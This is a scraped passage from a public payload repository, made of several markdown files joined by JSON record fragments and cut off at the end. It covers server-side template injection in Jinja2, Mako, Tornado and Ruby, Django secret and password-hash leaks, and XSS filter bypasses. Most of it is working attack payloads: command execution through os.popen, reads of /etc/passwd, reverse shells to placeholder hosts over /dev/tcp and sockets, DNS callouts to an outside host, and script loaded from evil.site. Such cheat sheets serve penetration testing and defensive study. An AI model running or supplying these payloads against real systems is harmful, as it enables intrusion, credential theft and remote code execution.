Cross-Site Scripting\n\n```python\n{{ '<script>alert(3)</script>' }}\n{{ '<script>alert(3)</script>' | safe }}\n```\n\n### Django - Debug Information Leak\n\n```python\n{% debug %}\n```\n\n### Django - Leaking App's Secret Key\n\n```python\n{{ messages.storages.0.signer.key }}\n```\n\n### Django - Admin Site URL leak\n\n```python\n{% include 'admin/base.html' %}\n```\n\n### Django - Admin Username And Password Hash Leak\n\n```ps1\n{% load log %}{% get_admin_log 10 as log %}{% for e in log %}\n{{e.user.get_username}} : {{e.user.password}}{% endfor %}\n\n{% get_admin_log 10 as admin_log for_user user %}\n```\n\n---\n\n## Jinja2\n\n[Official website](https://jinja.palletsprojects.com/)\n> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  \n\n### Jinja2 - Basic Injection\n\n```python\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\n```\n\nJinja2 is used by Python Web Frameworks such as Django or Flask.\nThe above injections have been tested on a Flask application.\n\n### Jinja2 - Template Format\n\n```python\n{% extends \"layout.html\" %}\n{% block body %}\n  <ul>\n  {% for user in users %}\n    <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>\n  {% endfor %}\n  </ul>\n{% endblock %}\n\n```\n\n### Jinja2 - Debug Statement\n\nIf the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.\n\n```python\n<pre>{% debug %}</pre>\n```\n\nSource: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)\n\n### Jinja2 - Dump All Used Classes\n\n```python\n{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n{{ ''.__class__.__mro__[2].__subclasses__() }}\n```\n\nAccess `__globals__` and `__builtins__`:\n\n```python\n{{ self.__init__.__globals__.__builtins__ }}\n```\n\n### Jinja2 - Dump All Config Variables\n\n```python\n{% for key, value in config.iteritems() %}\n    <dt>{{ key|e }}</dt>\n    <dd>{{ value|e }}</dd>\n{% endfor %}\n```\n\n### Jinja2 - Read Remote File\n\n```python\n# ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}\n```\n\n### Jinja2 - Write Into Remote File\n\n```python\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}\n```\n\n### Jinja2 - Remote Command Execution\n\nListen for connection\n\n```bash\nnc -lnvp 8000\n```\n\n#### Jinja2 - Forcing Output On Blind RCE\n\nYou can import Flask functions to return an output from the vulnerable page.\n\n```py\n{{\nx.__init__.__builtins__.exec(\"from flask import current_app, after_this_request\n@after_this_request\ndef hook(*args, **kwargs):\n    from flask import make_response\n    r = make_response('Powned')\n    return r\n\")\n}}\n```\n\n#### Exploit The SSTI By Calling os.popen().read()\n\n```python\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\n```\n\nBut when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:\n\n```python\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}\n```\n\nWe can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):\n\n```python\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ joiner.__init__.__globals__.os.popen('id').read() }}\n{{ namespace.__init__.__globals__.os.popen('id').read() }}\n```\n\nWith [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:\n\n```python\n{{ lipsum.__globals__[\"os\"].popen('id').read() }}\n```\n\n#### Exploit The SSTI By Calling subprocess.Popen\n\n:warning: the number 396 will vary depending of the application.\n\n```python\n{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n#### Exploit The SSTI By Calling Popen Without Guessing The Offset\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\n```\n\nSimple modification of the payload to clean up output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls)\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\n```\n\n#### Exploit The SSTI By Writing An Evil Config File\n\n```python\n# evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  \n\n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True) }}\n```\n\n### Jinja2 - Filter Bypass\n\n```python\nrequest.__class__\nrequest[\"__class__\"]\n```\n\nBypassing `_`\n\n```python\nhttp://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_\n\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\n```\n\nBypassing `[` and `]`\n\n```python\nhttp://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_\nor\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_\n```\n\nBypassing `|join`\n\n```python\nhttp://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_\n```\n\nBypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):\n\n```python\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\n```\n\n---\n\n## Tornado\n\n### Tornado - Basic Injection\n\n```py\n{{7*7}}\n{{7*'7'}}\n```\n\n### Tornado - Remote Command Execution\n\n```py\n{{os.system('whoami')}}\n{%import os%}{{os.system('nslookup oastify.com')}}\n```\n\n---\n\n## Mako\n\n[Official website](https://www.makotemplates.org/)\n> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.\n\n```python\n<%\nimport os\nx=os.popen('id').read()\n%>\n${x}\n```\n\n### Mako - Remote Command Execution\n\nAny of these payloads allows direct access to the `os` module\n\n```python\n${self.module.cache.util.os.system(\"id\")}\n${self.module.runtime.util.os.system(\"id\")}\n${self.template.module.cache.util.os.system(\"id\")}\n${self.module.cache.compat.inspect.os.system(\"id\")}\n${self.__init__.__globals__['util'].os.system('id')}\n${self.template.module.runtime.util.os.system(\"id\")}\n${self.module.filters.compat.inspect.os.system(\"id\")}\n${self.module.runtime.compat.inspect.os.system(\"id\")}\n${self.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.__init__.__globals__['os'].system('id')}\n${self.module.cache.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.os.system(\"id\")}\n${self.module.cache.compat.inspect.linecache.os.system(\"id\")}\n${self.template._mmarker.module.runtime.util.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.os.system(\"id\")}\n${self.template.module.runtime.compat.inspect.os.system(\"id\")}\n${self.module.filters.compat.inspect.linecache.os.system(\"id\")}\n${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.exceptions.util.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}\n${self.context._with_template.module.cache.util.os.system(\"id\")}\n${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.util.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.util.os.system(\"id\")}\n${self.module.cache.util.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")}\n${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}\n${self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}\n${self.template._mmarker.module.filters.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"id\")}\n${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"id\")}\n${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}\n${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}\n${self.context._with_template._mmarker.module.runtime.util.os.system(\"id\")}\n${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}\n```\n\nPoC :\n\n```python\n>>> print(Template(\"${self.module.cache.util.os}\").render())\n<module 'os' from '/usr/local/lib/python3.10/os.py'>\n```\n\n## References\n\n- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)\n- [Exploring SSTI in Flask/Jinja2, Part II - Tim Tomes - March 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)\n- [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)\n- [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)\n", "timestamp": "2025-10-21T13:30:21.546009"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Server Side Template Injection/Ruby.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md", "content": "# Server Side Template Injection - Ruby\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n- [Ruby](#ruby)\n    - [Ruby - Basic injections](#ruby---basic-injections)\n    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)\n    - [Ruby - List files and directories](#ruby---list-files-and-directories)\n    - [Ruby - Remote Command execution](#ruby---remote-command-execution)\n- [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n| ------------ | --------- |\n| Erb      | `<%= %>`   |\n| Erubi    | `<%= %>`   |\n| Erubis   | `<%= %>`   |\n| HAML     | `#{ }`     |\n| Liquid   | `{{ }}`    |\n| Mustache | `{{ }}`    |\n| Slim     | `#{ }`     |\n\n## Ruby\n\n### Ruby - Basic injections\n\n**ERB**:\n\n```ruby\n<%= 7 * 7 %>\n```\n\n**Slim**:\n\n```ruby\n#{ 7 * 7 }\n```\n\n### Ruby - Retrieve /etc/passwd\n\n```ruby\n<%= File.open('/etc/passwd').read %>\n```\n\n### Ruby - List files and directories\n\n```ruby\n<%= Dir.entries('/') %>\n```\n\n### Ruby - Remote Command execution\n\nExecute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.\n\n```ruby\n<%=(`nslookup oastify.com`)%>\n<%= system('cat /etc/passwd') %>\n<%= `ls /` %>\n<%= IO.popen('ls /').readlines()  %>\n<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>\n<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>\n```\n\nExecute code using SSTI for **Slim** engine.\n\n```powershell\n#{ %x|env| }\n```\n\n## References\n\n- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)\n", "timestamp": "2025-10-21T13:30:21.768551"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "XSS Injection/1 - XSS Filter Bypass.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md", "content": "# XSS Filter Bypass\n\n## Summary\n\n- [Bypass Case Sensitive](#bypass-case-sensitive)\n- [Bypass Tag Blacklist](#bypass-tag-blacklist)\n- [Bypass Word Blacklist with Code Evaluation](#bypass-word-blacklist-with-code-evaluation)\n- [Bypass with Incomplete HTML Tag](#bypass-with-incomplete-html-tag)\n- [Bypass Quotes for String](#bypass-quotes-for-string)\n- [Bypass Quotes in Script Tag](#bypass-quotes-in-script-tag)\n- [Bypass Quotes in Mousedown Event](#bypass-quotes-in-mousedown-event)\n- [Bypass Dot Filter](#bypass-dot-filter)\n- [Bypass Parenthesis for String](#bypass-parenthesis-for-string)\n- [Bypass Parenthesis and Semi Colon](#bypass-parenthesis-and-semi-colon)\n- [Bypass onxxxx= Blacklist](#bypass-onxxxx-blacklist)\n- [Bypass Space Filter](#bypass-space-filter)\n- [Bypass Email Filter](#bypass-email-filter)\n- [Bypass Tel URI Filter](#bypass-tel-uri-filter)\n- [Bypass document Blacklist](#bypass-document-blacklist)\n- [Bypass document.cookie Blacklist](#bypass-documentcookie-blacklist)\n- [Bypass using Javascript Inside a String](#bypass-using-javascript-inside-a-string)\n- [Bypass using an Alternate Way to Redirect](#bypass-using-an-alternate-way-to-redirect)\n- [Bypass using an Alternate Way to Execute an Alert](#bypass-using-an-alternate-way-to-execute-an-alert)\n- [Bypass \">\" using Nothing](#bypass--using-nothing)\n- [Bypass \"<\" and \">\" using ＜ and ＞](#bypass--and--using--and-)\n- [Bypass \";\" using Another Character](#bypass--using-another-character)\n- [Bypass using Missing Charset Header](#bypass-using-missing-charset-header)\n- [Bypass using HTML encoding](#bypass-using-html-encoding)\n- [Bypass using Katakana](#bypass-using-katakana)\n- [Bypass using Cuneiform](#bypass-using-cuneiform)\n- [Bypass using Lontara](#bypass-using-lontara)\n- [Bypass using ECMAScript6](#bypass-using-ecmascript6)\n- [Bypass using Octal encoding](#bypass-using-octal-encoding)\n- [Bypass using Unicode](#bypass-using-unicode)\n- [Bypass using UTF-7](#bypass-using-utf-7)\n- [Bypass using UTF-8](#bypass-using-utf-8)\n- [Bypass using UTF-16be](#bypass-using-utf-16be)\n- [Bypass using UTF-32](#bypass-using-utf-32)\n- [Bypass using BOM](#bypass-using-bom)\n- [Bypass using JSfuck](#bypass-using-jsfuck)\n- [References](#references)\n\n## Bypass Case Sensitive\n\nTo bypass a case-sensitive XSS filter, you can try mixing uppercase and lowercase letters within the tags or function names.\n\n```javascript\n<sCrIpt>alert(1)</ScRipt>\n<ScrIPt>alert(1)</ScRipT>\n```\n\nSince many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by tricking simple case-sensitive filters.\n\n## Bypass Tag Blacklist\n\n```javascript\n<script x>\n<script x>alert('XSS')<script y>\n```\n\n## Bypass Word Blacklist with Code Evaluation\n\n```javascript\neval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n```\n\n## Bypass with Incomplete HTML Tag\n\nWorks on IE/Firefox/Chrome/Safari\n\n```javascript\n<img src='1' onerror='alert(0)' <\n```\n\n## Bypass Quotes for String\n\n```javascript\nString.fromCharCode(88,83,83)\n```\n\n## Bypass Quotes in Script Tag\n\n```javascript\nhttp://localhost/bla.php?test=</script><script>alert(1)</script>\n<html>\n  <script>\n    <?php echo 'foo=\"text '.$_GET['test'].'\";';`?>\n  </script>\n</html>\n```\n\n## Bypass Quotes in Mousedown Event\n\nYou can bypass a single quote with &#39; in an on mousedown event handler\n\n```javascript\n<a href=\"\" onmousedown=\"var name = '&#39;;alert(1)//'; alert('smthg')\">Link</a>\n```\n\n## Bypass Dot Filter\n\n```javascript\n<script>window['alert'](document['domain'])</script>\n```\n\nConvert IP address into decimal format: IE. `http://192.168.1.1` == `http://3232235777`\n\n```javascript\n<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script>\n```\n\nBase64 encoding your XSS payload with Linux command: IE. `echo -n \"alert(document.cookie)\" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`\n\n## Bypass Parenthesis for String\n\n```javascript\nalert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;\n```\n\n## Bypass Parenthesis and Semi Colon\n\n- From @garethheyes\n\n    ```javascript\n    <script>onerror=alert;throw 1337</script>\n    <script>{onerror=alert}throw 1337</script>\n    <script>throw onerror=alert,'some string',123,'haha'</script>\n    ```\n\n- From @terjanq\n\n    ```js\n    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>\n    ```\n\n- From @cgvwzq\n\n    ```js\n    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>\n    ```\n\n## Bypass onxxxx Blacklist\n\n- Use less known tag\n\n    ```html\n    <object onafterscriptexecute=confirm(0)>\n    <object onbeforescriptexecute=confirm(0)>\n    ```\n\n- Bypass onxxx= filter with a null byte/vertical tab/Carriage Return/Line Feed\n\n    ```html\n    <img src='1' onerror\\x00=alert(0) />\n    <img src='1' onerror\\x0b=alert(0) />\n    <img src='1' onerror\\x0d=alert(0) />\n    <img src='1' onerror\\x0a=alert(0) />\n    ```\n\n- Bypass onxxx= filter with a '/'\n\n    ```js\n    <img src='1' onerror/=alert(0) />\n    ```\n\n## Bypass Space Filter\n\n- Bypass space filter with \"/\"\n\n    ```javascript\n    <img/src='1'/onerror=alert(0)>\n    ```\n\n- Bypass space filter with `0x0c/^L` or `0x0d/^M` or `0x0a/^J` or `0x09/^I`\n\n  ```html\n  <svg\fonload\f=\falert(1)\f>\n  ```\n\n```ps1\n$ echo \"<svg^Lonload^L=^Lalert(1)^L>\" | xxd\n00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al\n00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.\n```\n\n## Bypass Email Filter\n\n- [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)\n\n  ```javascript\n  \"><svg/onload=confirm(1)>\"@x.y\n  ```\n\n- [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)\n\n  ```javascript\n  xss@example.com(<img src='x' onerror='alert(document.location)'>)\n  ```\n\n## Bypass Tel URI Filter\n\nAt least 2 RFC mention the `;phone-context=` descriptor:\n\n- [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)\n- [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)\n\n```javascript\n+330011223344;phone-context=<script>alert(0)</script>\n```\n\n## Bypass Document Blacklist\n\n```javascript\n<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>\nwindow[\"doc\"+\"ument\"]\n```\n\n## Bypass document.cookie Blacklist\n\nThis is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.\n\n```js\nwindow.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});\n```\n\n## Bypass using Javascript Inside a String\n\n```javascript\n<script>\nfoo=\"text </script><script>alert(1)</script>\";\n</script>\n```\n\n## Bypass using an Alternate Way to Redirect\n\n```javascript\nlocation=\"http://google.com\"\ndocument.location = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\nwindow['location']['href']=\"http://google.com\"\n```\n\n## Bypass using an Alternate Way to Execute an Alert\n\nFrom [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040) tweet.\n\n```javascript\nwindow['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\nframes['alert'](5)\ncontent['alert'](6)\n\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n[12].forEach(alert);\n```\n\nFrom [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables\n\nThe Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.\n\n```javascript\nc=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; }\n// 5\n```\n\nThen calling alert is :\n\n```javascript\nObject.keys(self)[5]\n// \"alert\"\nself[Object.keys(self)[5]](\"1\") // alert(\"1\")\n```\n\nWe can find \"alert\" with a regular expression like ^a[rel]+t$ :\n\n```javascript\n//bind function alert on new function a()\na=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} \n\n// then you can use a() with Object.keys\nself[Object.keys(self)[a()]](\"1\") // alert(\"1\")\n```\n\nOneliner:\n\n```javascript\na=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\")\n```\n\nFrom [@quanyang](https://twitter.com/quanyang/status/1078536601184030721) tweet.\n\n```javascript\nprompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\rscript:alert(1)'\ndocument.location='java\\tscript:alert(1)'\n```\n\nFrom [@404death](https://twitter.com/404death/status/1011860096685502464) tweet.\n\n```javascript\neval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\n\nconstructor.constructor(\"aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\n\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\ntop[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\n\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\n\nsetTimeout`alert\\u0028document.domain\\u0029`;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n```\n\nBypass using an alternate way to trigger an alert\n\n```javascript\nvar i = document.createElement(\"iframe\");\ni.onload = function(){\n  i.contentWindow.alert(1);\n}\ndocument.appendChild(i);\n\n// Bypassed security\nXSSObject.proxy = function (obj, name, report_function_name, exec_original) {\n      var proxy = obj[name];\n      obj[name] = function () {\n        if (exec_original) {\n          return proxy.apply(this, arguments);\n        }\n      };\n      XSSObject.lockdown(obj, name);\n  };\nXSSObject.proxy(window, 'alert', 'window.alert', false);\n```\n\n## Bypass \">\" using Nothing\n\nThere is no need to close the tags, the browser will try to fix it.\n\n```javascript\n<svg onload=alert(1)//\n```\n\n## Bypass \"<\" and \">\" using ＜ and ＞\n\nUse Unicode characters `U+FF1C` and `U+FF1E`, refer to [Bypass using Unicode](#bypass-using-unicode) for more.\n\n```javascript\n＜script/src=//evil.site/poc.js＞\n```\n\n## Bypass \";\" using Another Character\n\n```javascript\n'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' % alert('%') % 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' > alert('>') > 'xt';\n'te' < alert('<') < 'xt';\n'te' == alert('==') == 'xt';\n'te' & alert('&') & 'xt';\n'te' , alert(',') , 'xt';\n'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof') instanceof 'xt';\n```\n\n## Bypass using Missing Charset Header\n\n**Requirements**:\n\n- Server header missing `charset`: `Content-Type: text/html`\n\n### ISO-2022-JP\n\nISO-2022-JP uses escape characters to switch between several character sets.\n\n| Escape    | Encoding        |\n|-----------|-----------------|\n| `\\x1B (B` | ASCII           |\n| `\\x1B (J` | JIS X 0201 1976 |\n| `\\x1B $@` | JIS X 0208 1978 |\n| `\\x1B $B` | JIS X 0208 1983 |\n\nUsing the [code table](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout), we can find multiple characters that will be transformed when switching from **ASCII** to **JIS X 0201 1976**.\n\n| Hex  | ASCII | JIS X 0201 1976 |\n| ---- | --- | --- |\n| 0x5c | `\\` | `¥` |\n| 0x7e | `~` | `‾` |\n\n**Example**:\n\nUse `%1b(J` to force convert a `\\'` (ascii) in to `¥'` (JIS X 0201 1976), unescaping the quote.\n\nPayload: `search=%1b(J&lang=en\";alert(1)//`\n\n## Bypass using HTML Encoding\n\n```javascript\n%26%2397;lert(1)\n&#97;&#108;&#101;&#114;&#116;\n></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>\n```\n\n## Bypass using Katakana\n\nUsing the [aemkei/Katakana](https://github.com/aemkei/katakana.js) library.\n\n```javascript\njavascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()\n```\n\n## Bypass using Cuneiform\n\n```javascript\n𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],\n𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]\n+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]\n+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\"(𒀀)\")()\n```\n\n## Bypass using Lontara\n\n```javascript\nᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\"(ᨆ)\")()\n```\n\nMore alphabets on [aem1k.com/aurebesh.js](http://aem1k.com/aurebesh.js/)\n\n## Bypass using ECMAScript6\n\n```html\n<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>\n```\n\n## Bypass using Octal 